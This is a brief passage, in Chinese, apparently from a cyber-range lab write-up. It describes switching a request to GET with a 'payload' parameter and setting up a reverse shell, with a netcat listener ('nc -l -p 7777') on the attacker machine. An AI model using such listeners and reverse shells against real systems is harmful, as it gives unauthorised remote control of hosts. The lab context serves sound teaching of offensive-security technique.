...
![error_4](../img/lihan3238_doc/error_4.png)

想起来靶场容器不允许 POST 请求，改为 GET 请求，同时修改 GET 请求的参数，将键 `v` 改为 `payload`：
...
- `lihanattacker` 在攻击机上监听端口，等待靶标容器连接

```bash
nc -l -p 7777
```

- `lihantargetserver` 在靶标容器中执行反弹 Shell 命令
